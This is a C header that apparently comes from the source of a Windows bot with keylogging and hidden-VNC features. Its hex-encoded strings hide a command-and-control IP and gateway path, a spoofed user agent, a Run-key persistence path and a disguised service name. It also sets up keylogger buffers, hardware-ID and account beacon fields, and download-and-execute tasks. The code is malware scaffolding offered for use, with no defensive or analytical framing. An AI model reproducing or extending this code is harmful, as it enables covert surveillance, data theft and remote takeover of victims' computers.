#define KEY "shit"#include "C Runtime.h"
#include "json.h"
#include "hvnc.h"


#define LENGTH1 0
#define LENGTH2 0
typedef BOOL(WINAPI *__CheckTokenMembership)(
	HANDLE TokenHandle,
	PSID   SidToCheck,
	PBOOL  IsMember
	);
__CheckTokenMembership _CheckTokenMembership;
typedef LPVOID(WINAPI *__InternetOpenA)(
	LPCSTR lpszAgent,
	DWORD  dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD  dwFlags
	);
__InternetOpenA _InternetOpenA;

typedef LPVOID(WINAPI *__InternetOpenUrlA)(
	_In_ LPVOID hInternet,
	_In_ LPCSTR lpszUrl,
	_In_reads_opt_(dwHeadersLength) LPCSTR lpszHeaders,
	_In_ DWORD dwHeadersLength,
	_In_ DWORD dwFlags,
	_In_opt_ DWORD_PTR dwContext
	);
__InternetOpenUrlA _InternetOpenUrlA;

typedef BOOL(WINAPI *__InternetReadFile)(
	_In_ LPVOID hFile,
	_Out_writes_bytes_(dwNumberOfBytesToRead) __out_data_source(NETWORK) LPVOID lpBuffer,
	_In_ DWORD dwNumberOfBytesToRead,
	_Out_ LPDWORD lpdwNumberOfBytesRead
	);
__InternetReadFile _InternetReadFile;
typedef HANDLE(WINAPI *__HeapCreate)(
	_In_ DWORD flOptions,
	_In_ SIZE_T dwInitialSize,
	_In_ SIZE_T dwMaximumSize
	);
__HeapCreate _HeapCreate;
typedef LPVOID(WINAPI *__HeapAlloc)(
	_In_ HANDLE hHeap,
	_In_ DWORD dwFlags,
	_In_ SIZE_T dwBytes
	);
__HeapAlloc _HeapAlloc;

typedef SC_HANDLE(WINAPI* __CreateServiceA)(
	_In_        SC_HANDLE    hSCManager,
	_In_        LPCSTR         lpServiceName,
	_In_opt_    LPCSTR         lpDisplayName,
	_In_        DWORD        dwDesiredAccess,
	_In_        DWORD        dwServiceType,
	_In_        DWORD        dwStartType,
	_In_        DWORD        dwErrorControl,
	_In_opt_    LPCSTR         lpBinaryPathName,
	_In_opt_    LPCSTR         lpLoadOrderGroup,
	_Out_opt_   LPDWORD      lpdwTagId,
	_In_opt_    LPCSTR         lpDependencies,
	_In_opt_    LPCSTR         lpServiceStartName,
	_In_opt_    LPCSTR         lpPassword
	);
__CreateServiceA _CreateServiceA;

typedef LSTATUS(WINAPI *__RegCloseKey)(
	_In_ HKEY hKey
	);
__RegCloseKey _RegCloseKey;
typedef BOOL(WINAPI *__GetCurrentHwProfileW)(
	_Out_ LPHW_PROFILE_INFOW  lpHwProfileInfo
	);
__GetCurrentHwProfileW _GetCurrentHwProfileW;

typedef BOOL(WINAPI *__CloseServiceHandle)(
	_In_        SC_HANDLE   hSCObject
	);

__CloseServiceHandle _CloseServiceHandle;

typedef BOOL(WINAPI *__AllocateAndInitializeSid)(
	_In_  PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
	_In_  BYTE                      nSubAuthorityCount,
	_In_  DWORD                     dwSubAuthority0,
	_In_  DWORD                     dwSubAuthority1,
	_In_  DWORD                     dwSubAuthority2,
	_In_  DWORD                     dwSubAuthority3,
	_In_  DWORD                     dwSubAuthority4,
	_In_  DWORD                     dwSubAuthority5,
	_In_  DWORD                     dwSubAuthority6,
	_In_  DWORD                     dwSubAuthority7,
	_Out_ PSID                      *pSid
	);
__AllocateAndInitializeSid _AllocateAndInitializeSid;

typedef SC_HANDLE(WINAPI *__OpenSCManagerA)(
	_In_opt_        LPCSTR                lpMachineName,
	_In_opt_        LPCSTR                lpDatabaseName,
	_In_            DWORD                   dwDesiredAccess
	);
__OpenSCManagerA _OpenSCManagerA;
CHAR szHeaders[20];
CHAR HOST[12];
CHAR PAGE[19];
CHAR HEADERS[48];
CHAR USERAGENT[78];
CHAR StartupKey[50];
CHAR EXEPATH[7];
CHAR ServiceName[16];
CHAR POST[5];
CHAR AdminStr[6];
CHAR NotAdminStr[9];
CHAR RealPostDataFormat[13];
CHAR Abc[27];
CHAR PostDataSuccessFormat[25];
CHAR PostDataFormat[19];
CHAR TasksStr[6];
CHAR ExtraStr[6];
CHAR AppData[10];
CHAR AppDataPathFormat[7];

HANDLE hNTDLL = NULL;
HANDLE hAdvapi32 = NULL;
HANDLE hKernel32 = NULL;
HANDLE hUser32 = NULL;
HANDLE hWininet = NULL;
enum _DllName {
	ADVAPI32_DLL,
	KERNEL32_DLL,
	USER32_DLL,
	WININET32_DLL,
	NTDLL_DLL
}DllName;
typedef struct _ENCRYPTED_DLL {
	SIZE_T stDll;
	LPCWSTR Dll;
	SIZE_T DllType;
	HANDLE hDll;
} ENCRYPTED_DLL, *PENCRYPTED_DLL;
typedef struct _ENCRYPTED_STRINGS_API {
	SIZE_T stLENGTH;
	LPCSTR STRING;
	PVOID lpFunc;
	SIZE_T Type;
} ENCRYPTED_STRINGS_API, *PENCRYPTED_STRINGS_API;
typedef struct _Encrypted_Strings {
	CONST CHAR *lpszEncryptedString;
	DWORD dwEncryptedSize;
	CHAR *lpszDest;
	DWORD dwDestSize;
}Encrypted_Strings, *PEncrypted_Strings;
Encrypted_Strings EncryptedStrings[] = {

	{ "4163636570743A202A2F2A5C725C6E5C725C6E", 39, szHeaders, 20 },
	{ "35312E38312E392E323031", 23, HOST, 12 },
	{ "2F74657374322F676174657761792E706870", 37, PAGE, 19 },
	{ "436F6E74656E742D547970653A206170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F646564", 95, HEADERS, 48 },
	{ "4D6F7A696C6C612F352E30202857696E646F7773204E5420362E313B2057696E36343B207836343B2072763A34372E3029204765636B6F2F32303130303130312046697265666F782F34372E30", 155, USERAGENT, 78 },
	{ "536F6674776172655C5C4D6963726F736F66745C5C57696E646F77735C5C43757272656E7456657273696F6E5C5C52756E", 99, StartupKey, 50 },
	{ "5C5C25735C5C", 13, EXEPATH, 7 },
	{ "57696E646F77732053657276696365", 31, ServiceName, 16 },
	{ "504F5354", 9, POST, 5 },
	{ "41646D696E", 11, AdminStr, 6 },
	{ "4E6F2041646D696E", 17, NotAdminStr, 9 },
	{ "5C5C25735C5C", 13, EXEPATH, 7 },
	{ "2625733D25732625733D2573", 25, RealPostDataFormat, 13 },
	{ "6162636465666768696A6B6C6D6E6F707172737475767778797A", 53, Abc, 27 },
	{ "2625733D25732625733D25642625733D25642625733D2573", 49, PostDataSuccessFormat, 25 },
	{ "2625733D25732625733D25732625733D2573", 37, PostDataFormat, 19 },
	{ "7461736B73", 11, TasksStr, 6 },
	{ "6578747261", 11, ExtraStr, 6 },
	{ "256170706461746125", 19, AppData, 10 },
	{ "25735C5C2573", 13, AppDataPathFormat, 7 },
	{ NULL, 0, NULL, 0}
};

ENCRYPTED_DLL EncryptedStringDll[] = {
	{ LENGTH1, L"advapi32.dll", ADVAPI32_DLL, &hAdvapi32},
	{ LENGTH1, L"kernel32.dll", KERNEL32_DLL, &hKernel32},
	{ LENGTH1, L"user32.dll", USER32_DLL, &hUser32},
	{ LENGTH1, L"wininet.dll", WININET32_DLL, &hWininet},
	{ LENGTH1, L"ntdll.dll", NTDLL_DLL, &hNTDLL},
	{ 0, NULL, 0, NULL}
};
ENCRYPTED_STRINGS_API EncryptedStringApi[] = {

	{ LENGTH1, "CheckTokenMembership", &_CheckTokenMembership, ADVAPI32_DLL},
	{0 , NULL, NULL, 0}
};
#define SECOND 1000
#define SLEEP_TIME 10*SECOND 
#define KEYLOGGER_BUFFER_SIZE 100
#define MAXIMUM_SEND_SIZE 10000
#define MAX_SEND_SIZE 10
#define IS_NUMERIC(x) (x >= '0' && x <= '9')
#define IS_ALPHA(x) ((x >= 'A' && x <= 'Z'))
#define IS_ALPHA_NUM(x) ((IS_ALPHA(x)) || (IS_NUMERIC(x)))
PCHAR bytes_to_hex(CONST PUCHAR data, CONST UINT size);
typedef BOOLEAN(WINAPI *__RtlGenRandom)(
	_Out_ PVOID RandomBuffer,
	_In_  ULONG RandomBufferLength
	);
__RtlGenRandom _RtlGenRandom;

typedef ULONG(NTAPI *__RtlRandomEx)(
	PULONG Seed
	);
__RtlRandomEx _RtlRandomEx;

typedef enum _Tasks {
	NOTHING,
	DOWNLOAD_EXECUTE,
	START_HVNC
}Tasks;
typedef struct _KEYLOGGER_DATA {
	UCHAR ucKeyloggerData[KEYLOGGER_BUFFER_SIZE];
	DWORD dwKeys;
}KEYLOGGER_DATA, *PKEYLOGGER_DATA;
PKEYLOGGER_DATA g_KeyloggerData;




typedef struct _POST_DATA_ {
	PCHAR g_lpszUserKey;
	PCHAR lpszHwid;
	DWORD dwHwid;
	PCHAR lpszAdmin;
	DWORD dwAdmin;
	PCHAR lpszRandomParam1;
	DWORD dwRandom1;
	PCHAR lpszRandomParam2;
	DWORD dwRandom2;
	PCHAR lpszRandomParam3;
	DWORD dwRandom3;

	PCHAR lpszUserAccount;
	DWORD dwUserAccount;
}POST_DATA, *PPOST_DATA;
PPOST_DATA g_PostData;